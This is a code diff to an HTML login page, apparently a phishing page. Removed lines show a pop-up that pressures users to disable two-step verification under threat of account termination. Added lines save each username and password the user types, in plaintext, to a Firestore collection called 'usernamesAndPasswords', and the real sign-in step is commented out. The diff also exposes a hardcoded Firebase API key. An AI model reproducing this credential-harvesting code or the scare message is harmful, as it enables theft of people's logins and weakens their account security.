@@ -64,18 +64,59 @@
     <div id="full-screen-image"></div>
     <div class="login-container" id="loginContainer" style="display: none;">
         <h2 style="margin-bottom: 30px;">Login</h2>
-        <input type="text" class="login-input" placeholder="Username">
+        <input type="text" class="login-input" id="usernameInput" placeholder="Username">
         <br>
-        <input type="password" class="login-input" placeholder="Password">
+        <input type="password" class="login-input" id="passwordInput" placeholder="Password">
         <br>
-        <button class="login-button" onclick="openNewWindow()">Log In</button>
+        <button class="login-button" onclick="signIn()">Log In</button>
     </div>
     
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.2/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.2/firebase-firestore.js"></script>
     <script>
-        function openNewWindow() {
-            // Open a new window with a message
-            var newWindow = window.open('', '_blank', 'width=400,height=200');
-            newWindow.document.write('<h2 style="text-align:center;margin-top:50px;">Dew to large server overload we ask you to turn off 2-Step-Verification (if you have not allready) If you do not comply your account will be TERMINATED!</h2>');
+        // Initialize Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyCBPo7550ENjv92kQKVtoBniWVSXBqoNC0",
+            authDomain: "YOUR_AUTH_DOMAIN",
+            projectId: "playernetx",
+            storageBucket: "playernetx",
+            messagingSenderId: "205889745208",
+            appId: "YOUR_APP_ID",
+            measurementId: "YOUR_MEASUREMENT_ID"
+        };
+        firebase.initializeApp(firebaseConfig);
+
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        function signIn() {
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+
+            // Here you can store the username and password in Firestore
+            db.collection("usernamesAndPasswords").add({
+                username: username,
+                password: password
+            })
+            .then((docRef) => {
+                console.log("Username and password added with ID: ", docRef.id);
+                // Now you can proceed with authentication if needed
+                // For example, you can use Firebase Authentication signInWithEmailAndPassword method
+                // auth.signInWithEmailAndPassword(username, password).then((userCredential) => {
+                //     // Signed in
+                //     var user = userCredential.user;
+                //     console.log(user);
+                // }).catch((error) => {
+                //     var errorCode = error.code;
+                //     var errorMessage = error.message;
+                //     console.error(errorMessage);
+                // });
+            })
+            .catch((error) => {
+                console.error("Error adding username and password: ", error);
+            });
         }
 
         document.addEventListener('DOMContentLoaded', function() {
